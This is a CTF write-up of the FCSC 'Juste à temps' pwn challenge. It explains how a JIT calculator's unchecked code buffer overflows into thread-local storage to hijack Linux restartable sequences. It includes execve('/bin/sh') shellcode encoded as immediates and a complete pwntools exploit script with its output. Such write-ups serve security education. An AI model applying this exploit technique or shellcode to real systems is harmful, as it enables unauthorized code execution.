# Pwn - Juste à temps

- Difficulty: :star::star::star:
- Solves: 3
- Points: 495
- Author: XeR

> Vous avez vu ma nouvelle calculatrice ? Bon, les résultats sont faux, mais ils arrivent super vite !

The title and description hint at a jit calculator.

### Files

- `juste-a-temps`, main binary
- `libc-2.41.so` `ld-2.41.so`
- Dockerfiles
- source code

## Overview

The program is a calculator that will parse and calculate our input.
```
$ ./juste-a-temps
JIT page @ 0x7fa1650a3000
1+1
2
aaa
Could not parse expression
```

## Analysis

The author gave us the source code, the program starts by allocating the `rwx` page used to store the compiled code and gives us its address, which is right next to `tls` and `libc`. \
We can see that by looking at the memory layout, (make sure to check in the docker container / virtual machine as the memory layout may change here)

```
...
0x00006fae2b390000 0x00006fae2b3a0000 0x0000000000010000 rwx <- JIT code stored here
0x00006fae2b3a0000 0x00006fae2b3a3000 0x0000000000003000 rw- <tls-th1>
0x00006fae2b3a3000 0x00006fae2b3cb000 0x0000000000028000 r-- /root/libc.so.6
...
```
```c
void *jit = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
if(MAP_FAILED == jit) {
	perror("mmap");
	return EXIT_FAILURE;
}
printf("JIT page @ %p\n", jit);
```

The program will then wait for an input with `getline()`, and then call `parse()` to construct an AST tree. This tree will then by used by `compile()` to output the code in the jit page.

The calculator also have a 'clear' option, that will `execv()` itself.
```c
if(0 == strcmp(buffer, "clear\n")) {
	execv("/proc/self/exe", argv);
	perror("execve");
	exit(EXIT_FAILURE);
}
```
```c
// Parse the line
struct op *ast = NULL;
const char *p = parse(buffer, &ast);
if(NULL == p) {
	puts("Could not parse expression");
	continue;
}
// Ensure there's nothing left
struct token tok;
p = lexer(p, &tok);
if(NULL == p || TOK_END != tok.type) {
	puts("Could not parse expression");
	continue;
}
```
```c
// Compile the code to make it go fast
size_t s = compile(jit, ast);
// Compiled code is too large… try with smaller numbers?
if(s > 0x10000)
	panic();

// We don't need the AST anymore
op_del(ast);

long (*f)(void) = jit;
printf("%ld\n", f()); // run the compiled code
```




## Bug hunting

### Buffer overflow in the jit page
There are some checks, but the most important (and weird) one here is the call to `panic()` if the compiled code is too large (> 0x10000). \
Indeed there is a bug since `compile()` doesn't check the size when writing the compiled code.

### Bad compiled code?
We could also look in `compile()` (jit.c) for other bugs, the function parse the AST tree and appends code to the jit page. Maybe the instruction are wrong and there could be an issue that could lead to arbitrary code execution. \
The function emits the code in a reverse polish notation style (using the stack), it has 3 ways of pushing a number constant (using `emit_push()`) on the stack depending on its size to minimize the code length.
- emit_push8 (<= 127), it emits {0x6A, n}, which is correct.
- emit_push32 (<= 2147483647), {0x68, n, n >> 8, n >> 16, n >> 24}, also correct
- emit_push64 {0x48, 0xB8, n, n >> 8, ..., n >> 56, 0x50}, also correct (`movabs rax, n` & `push rax`)

Let's look at how the operations are handled, they all pop 2 values off the stack, do the operation and then push the result. (using `emit_op2()`). All 3 of them are safe too.
Lastly, it adds an epilogue at the end of the code (`pop rax` & `ret`). \
I don't see any other bug in `compile()` besides the buffer overflow due to the lack of size checks.

Perhaps the compiled code might modify some registers that should be preserved across calls ? The code only uses rax and rdx and sadly the instructions used (like `mul`) have no side effects that could help us.

### Stack overflow
The is also another bug in the parsing logic, `parse()` uses recursion to deal with parenthesis in our input. If we input a bunch of `(` it will end up crashing due to a stack overflow. However this bug doesn't look exploitable.

I didn't find any other bug in the parser or lexer.


## Exploiting the bug

So our only hope is the buffer overflow in the jit page. \
As seen previously, the jit page is located right before the `tls`. There are a lot of paths to gain arbitrary code execution when one is capable of modifying the `tls` (like `tls_dtor_list`). \
Unfortunately, if we overflow into the `tls`, the code will immediatly call `panic()` after.
```c
[[noreturn]]
static void panic(void)
{
	static const char str[] = "\x1B[31mError\x1B[0m: too much maths\n"
		"Starting emergency procedure\n";
	write(STDOUT_FILENO, str, __builtin_strlen(str));
	sleep(3);
	_exit(EXIT_FAILURE);
	asm("hlt");
}
```
`panic()` doesn't use any complex stdio function to print the error, and exit by using `_exit()` which directly uses a syscall to exit so we cannot use these techniques because they only work on a program that would use the normal `exit()` function. \
I still went in the 3 functions to see if they use the `tls` at any point, they all end up using `__internal_syscall_cancel()` which uses the `tls` to deal with threading, however the function skip this if the process is single threaded (and we cannot modify `__libc_single_threaded` so I did not look this path further, but I don't think it leads anywhere).

We can still try to overflow the jit page, maybe it could trigger a crash that would lead somewhere...
- Overflowing too much will overwrite the stack canary stored in the `tls` and the process will abort, so we cannot overflow further.
- The `tls` value used in `__internal_syscall_cancel()` can also crash the process if `tls+0x18` (`tcbhead_t->self`) is not a valid pointer.
- Another pointer can crash the process (`tls-0x60`), it seems to be used in the `spaces()` function used by the lexer. Probably due to the use of `ctypes` to determine if a character is a space or not, it doesn't look useful.

```
-0xc0: 0x0000000600000006
-0xb8: 0x0000000000000000 <- weird crash 'tls-0xb8'
-0xb0: 0x0000000000000000
-0xa8: 0x0000000000000000
-0xa0: 0x0000000000000000
-0x98: 0x0000000000000000
-0x90: 0x0000000000000000
-0x88: 0x00007ffff7fb13c0
-0x80: 0x00007ffff7fb8740
-0x78: 0x0000000000000000
-0x70: 0x00007ffff7f579e0
-0x68: 0x00007ffff7f57fe0
-0x60: 0x00007ffff7f588e0 <- spaces() related crash
-0x58: 0x0000000000000000
-0x50: 0x0000000000000000
-0x48: 0x0000000000000000
-0x40: 0x000055555555d010
-0x38: 0x0000000000000000
-0x30: 0x00007ffff7fb0ac0
-0x28: 0x0000000000000000
-0x20: 0x0000000000000000
-0x18: 0x0000000000000000
-0x10: 0x0000000000000000
-0x08: 0x0000000000000000
+0x00: 0x00007ffff7dc6740 <- fsbase 'tls'
+0x08: 0x00007ffff7dc70e0
+0x10: 0x00007ffff7dc6740 <- __internal_syscall_cancel() related crash
+0x18: 0x0000000000000000
+0x20: 0x0000000000000000
+0x28: 0xb248eef1e9ee5700  <-  stack canary related crash
+0x30: 0x6f5b0c9de2a519b6
```

### Strange segfault
And there's another crash when we overwrite `tls-0xb8`, it doesn't seems to be caused by any function. If we put a breakpoint on any instruction (like a simple mov that doesn't dereference anything) and modify this value, the process will still receive a `SIGSEGV` signal when we continue. \
The two integers behind also get reset from nowhere when we modify them. \
This is probably coming from deeper so I made a short program that would modify `tls-0xc0` (the two integers) and debugged the kernel in a virtual machine while running it.

We quickly see that the value is reset in any syscall, this confirms that the kernel is doing something here. Further debugging will show that [`rseq_handle_notify_resume()`](https://elixir.bootlin.com/linux/v6.13.8/source/include/linux/rseq.h#L34) is the function behind this.
It gets called when the kernel returns from a syscall: [`do_syscall_64()`](https://elixir.bootlin.com/linux/v6.13.8/source/arch/x86/entry/common.c#L89), it also gets called when a thread is migrated, preempted or when it receives a signal.

### Restartable Sequences

When I saw that, I searched about `rseq` and found a [blogpost](https://www.efficios.com/blog/2019/02/08/linux-restartable-sequences/) about it. \
Restartable sequences is a mechanism to deal with concurrency. \
A thread can setup a restartable sequence to access data, if this threads then receive a signal, gets preempted or migrated, the kernel will call an abort handler to avoid data races.

By the way, if we strace the challenge binary, we will see a `rseq` syscall. I should have run strace on the binary sooner :pensive:. This also explains why the author gave a recent libc (2.41).\
And if we look at the first argument of the call to `rseq` (the [`rseq struct`](https://elixir.bootlin.com/linux/v6.13.8/source/include/uapi/linux/rseq.h#L62)), we actually get the address of the weird values in the `tls` (at `-0xc0`).

This is the struct that the thread needs to register using the syscall
```c
struct rseq {
    u32 cpu_id_start;
    u32 cpu_id;
    struct rseq_cs* rseq_cs;
    u32 flags;
    u32 node_id;
    u32 mm_cid;
}
```
Now if the thread want to access data, it can set the `rseq_cs` field
```c
struct rseq_cs {
    u32 version;
    u32 flags;
    void* start_ip; // start of the critical section
    u64 post_commit_offset; // length of the critical section
    void* abort_ip; // the abort handler
}
```
From now on, if the thread gets preempted, migrate or receives a signal and is currently in the critical section. It will call the abort handler.

### Attacking restartable sequences

What if we setup a `rseq_cs` with an abort handler that points to our code, we can do that since the `rseq` struct is in the `tls`.

The kernel code behind restartable sequences have lots of checks that we need to pass (the kernel will force a `SIGSEGV` signal if one of them fails), [`rseq_ip_fixup()`](https://elixir.bootlin.com/linux/v6.13.8/source/kernel/rseq.c#L274) is the function that sets `rip` to the abort handler if needed. \
Here are the main requirements:

([`rseq_get_rseq_cs()`](https://elixir.bootlin.com/linux/v6.13.8/source/kernel/rseq.c#L177))
- The critical section needs to be in a valid task memory (like a valid userspace pointer)
- same for the abort handler
- version needs to be 0
```c
if (rseq_cs->start_ip >= TASK_SIZE ||
	rseq_cs->start_ip + rseq_cs->post_commit_offset >= TASK_SIZE ||
	rseq_cs->abort_ip >= TASK_SIZE ||
	rseq_cs->version > 0)
		return -EINVAL;
```
- The abort handler cannot be in the critical section.
```c
if (rseq_cs->abort_ip - rseq_cs->start_ip < rseq_cs->post_commit_offset)
	return -EINVAL;
```
- This one is a bit ugly, but our handler need a 32 bit signature at `abort_ip-4`, so we cannot put a onegadget, we need to jump on our own code, luckily there is a rwx jit page containing our code.
```c
usig = (u32 __user *)(unsigned long)(rseq_cs->abort_ip - sizeof(u32));
ret = get_user(sig, usig);
if (ret)
	return ret;
if (current->rseq_sig != sig) {
	printk_ratelimited(KERN_WARNING
		"Possible attack attempt. Unexpected rseq signature 0x%x, expecting 0x%x (pid=%d, addr=%p).\n",
		sig, current->rseq_sig, current->pid, usig);
	return -EINVAL;
}
```
The signature used is the last argument of the `rseq` syscall, so we can retrieve it with strace (it is a constant)
> rseq(0x7f417ce63680, 0x20, 0, **0x53053053**) = 0

[`rseq_need_restart()`](https://elixir.bootlin.com/linux/v6.13.8/source/kernel/rseq.c#L218) have more checks:
- rseq_cs->flags needs to be 0 (only way to get `rseq_warn_flags()` to return false)
- same for rseq->flags


### Where to jump

If we input a sequence of nested addition like this: `a+(b+(c+(d+...)))`, the parser and compiler will put series of push instruction in the code, in the abcd... order. \
If those numbers are big enough, `emit_push()` will emit a 64 bit push (using `movabs`) and we will be able control 8 bytes parts in the jit page. Those 8 bytes parts will contains our shellcode (actually 6 bytes because 2 bytes are reserved to jump to the next part).

This is a useful trick I learned in a [blogpost](https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox/) (same idea used with wasm code in v8). \
I already had code to convert a shellcode into a series of movabs, I used it on a `execve("/bin/sh")` shellcode but one could also put a small `read()` shellcode and rewrite the rwx page with a bigger shellcode.

```py
code = """
xor eax, eax
mov ebx, 0x0068732f
shl rbx, 32
mov ecx, 0x6e69622f
or rbx, rcx
push rbx
mov rdi, rsp
xor esi, esi
xor edx, edx
push 0x3b   
pop rax
syscall
"""

code = [asm(c) for c in code.splitlines()]
jmp = b"\xeb\x03" # jmp 5

parts = [b""]
for c in code:
    p = parts[-1]
    if len(p) + len(c) > 6:
        parts[-1] = p.ljust(6, b"\x90") + jmp
        parts.append(c)
    else:
        parts[-1] += c
parts[-1] = p.ljust(6, b"\x90") + jmp
parts = [u64(p) for p in parts]
```
pwntool's `asm()` is slow so I printed the numbers and then hardcoded them. Don't forget to edit the first one to include the required restartable sequence signature:
```py
numbers = [
    0x03eb909053053053,
    0x03eb90909090c031,
    0x03eb900068732fbb,
    0x03eb909020e3c148,
    0x03eb906e69622fb9,
    0x03eb909053cb0948,
    0x03eb90f631e78948,
    0x03eb90583b6ad231,
    0x03eb90909090050f,
]
```
The abort handler will have to point to `rwx+6` (2 for the `movabs` instruction and another 4 for the signature)


### Rewriting tls with compiled code

We want to overwrite the `rseq_cs` member of the `rseq` struct, we could simply use a 64 bit push and align it properly so the data part of the `movabs` instruction matches with the start of the member. \
However as said before the kernel have a lot of checks, and `rseq->flags` must be 0 so we cannot do that.
```
... (start of rseq struct)
0x00: 0x0068123456786812 <- cpu_id_start & cpu_id (ignore)
0x08: 0xYYYYYYb848XXXXXX <- rseq_cs
0x10: 0x585a50ZZ00000000 <- flags & node_id (ignore node_id)
0x18: 0x0148585a50d00148 <- mm_cid (ignore)
```
We will have to overwrite these 2 values with two pushes. First of all, the last one needs to be a 64 bit push because we need:
- 4 bytes for the `flags` member
- 2 bytes for the upper part of the `rseq_cs` pointer (actually one more because the sixth byte needs to be controlled as well since the ASLR doesn't fully randomize it), 'Y'
- 1 more byte at the end (first byte of `node_id`) so we can actually input a 64 bit push (since `flags` is 0, `emit_push()` will choose `emit_push32()` if we don't do that), 'Z'

Then we just need a 32 bit push to control the 3 first bytes of `rseq_cs` ('X').

Finally, 16 bits are fixed by the `movabs`, we also need to make sure the most significant bit of our 32 bit push number is 0 (`emit_push()` compares numbers using signed integer max) so we have a 17 bit ASLR bruteforce in the end. We can use the "Clear and execve" functionality until we get a correct address.


It is a bit tricky to get the wanted alignment, I used a combinaison of char, int and long pushes to reach the offset.

The `rseq_cs` struct is harder to write, the first 2 members (`environ` and `flags`) needs to be 0, we cannot write 8 null bytes with the same technique. \
The program uses `getline()` to read our input, which internally uses `realloc()` so we can get a mmap-ed chunk if our input is large enough (that will be at a fixed offset from the jit page) and put our `rseq_cs` struct in it.


# Exploit

```py
from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

file = './juste-a-temps'
exe_args = []
PREFIX = (b": ", b"> ", b"expression\n")
speed = 0.2

io: process = None

def debug(pid=io):
    gdb.attach(pid, gdbscript=
    """
    #hb* 0x5555555553fd
    #hb* 0x555555555428
    """, exe=file)
    input("debug")

def launch_remote():
    global file, io
    host = args.HOST if args.HOST else 'chall.fcsc.fr'
    port = args.PORT if args.PORT else 2111
    io = remote(host, port)

def launch_docker():
    global file, io
    io = remote("localhost", 4000)
    sleep(speed)
    if args.GDB:
        out = subprocess.run(["pgrep", "--newest", "^juste-a-temps$"], capture_output=True)
        debug(int(out.stdout))

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug(io)

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rol(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: ror(addr, 17) ^ cookie
ptr_getcookie = lambda mangled, demangled: ptr_demangle(mangled, demangled)
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def printx(**kwargs):
    for k, v in kwargs.items():
        success("%s: %#x" % (k, v))

def launch():
    if args.REMOTE:
        l = launch_remote
    elif args.DOCKER:
        l = launch_docker
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = exe.libc
context.binary = exe

tries = 0

def exploit():
    i = 0
    prog = log.progress("rerolls")
    while True:
        prog.status(hex(i))
        recvu(b"@ ")
        rwx = int(recvu(b"\n", True), 16)
        rseq_cs = rwx - 0x21000 + 0x10 + 0x10000
        if ((rwx>>24)&0xffff) == 0xb848: # 2 fixed bytes
            if (rseq_cs >> 23) & 1 == 0: # 1 fixed bit (because of emit_push())
                break
        i += 1
        sl(b"clear") # reroll aslr
    printx(jit=rwx, rseqcs=rseq_cs)
    sl(b"")

    def interact(data):
        if type(data) == str:
            data = data.encode()
        sla(b"\n", data)
        sleep(speed)

    # getline will need a big chunk -> malloc will use mmap
    interact(f"A"*0x20000)
    # prepare rseq_cs struct
    payload = flat([
        0, # environ & flags (needs to be 0)
        rwx+0x10000, # critical section start
        0x200000, # critical section size
        rwx+2+4, # abort handler
    ])
    interact(b"A"*0x10000 + payload) # put it far away so our next input doesn't break it


    # code used to generate the shellcode
#     code = """
# xor eax, eax
# mov ebx, 0x0068732f
# shl rbx, 32
# mov ecx, 0x6e69622f
# or rbx, rcx
# push rbx
# mov rdi, rsp
# xor esi, esi
# xor edx, edx
# push 0x3b   
# pop rax
# syscall
# """

    # code = [asm(c) for c in code.splitlines()]
    # jmp = b"\xeb\x03" # jmp 5
    # parts = [b""]
    # for c in code:
    #     p = parts[-1]
    #     if len(p) + len(c) > 6:
    #         parts[-1] = p.ljust(6, b"\x90") + jmp
    #         parts.append(c)
    #     else:
    #         parts[-1] += c
    # parts[-1] = p.ljust(6, b"\x90") + jmp
    # numbers = [u64(p) for p in parts]
    
    # print(numbers)

    numbers = [
        0x03eb909053053053,
        0x03eb90909090c031,
        0x03eb900068732fbb,
        0x03eb909020e3c148,
        0x03eb906e69622fb9,
        0x03eb909053cb0948,
        0x03eb90f631e78948,
        0x03eb90583b6ad231,
        0x03eb90909090050f,
    ]

    payload = b""
    for n in numbers:
        payload += str(n).encode() + b"+("
    payload += b"0" + b")"*len(numbers)

    # roughly overflow into tls
    payload2 = "+9999999999"*3943
    # close to our target, be more precise
    # push char = 2
    # push int = 5
    # push long = 11
    payload2 += f"+({0x12345678}"*4 # 4 ints (20)
    # 23 lower bit of rseq_cs here
    payload2 += f"+({(rseq_cs & 0x7fffff)<<8}" # int
    # rseq->flags also needs to be 0, use a push64 for that
    # 24 upper bit of rseq_cs here
    # 17 fixed bits -> 1/0x20000 bruteforce
    payload2 += f"+({0xaa00000000000000 | (rseq_cs >> 40)}" # long
    payload2 += ")"*4 + "))"
    interact(payload + payload2.encode())

    success("shell")
    sleep(3)
    sl(b"cat flag.txt")

    io.interactive()
    exit()

if not args.BF:
    launch()
    exploit()
    exit()
else:
    tries_prog = log.progress("Tries")
    while True:
        tries += 1
        tries_prog.status(str(tries))

        launch()
        try:
            exploit()
        except EOFError:
            pass

        with context.local(log_level=logging.ERROR):
            io.close()
```

```
$ python3 exploit.py REMOTE
[/] rerolls: 0x20e6                                                                             
[+] jit: 0x62b84868d000
[+] rseqcs: 0x62b84867c010
[+] shell
[*] Switching to interactive mode
Error: too much maths
Starting emergency procedure
FCSC{e661251be8d04d3296a861651828cd0c6578844e12b6e5c6dcaaf3bdd5c3ae95}
```


# Conclusion

I loved the challenge, it was really cool to discover and exploit rseq by myself. Huge thanks to the author.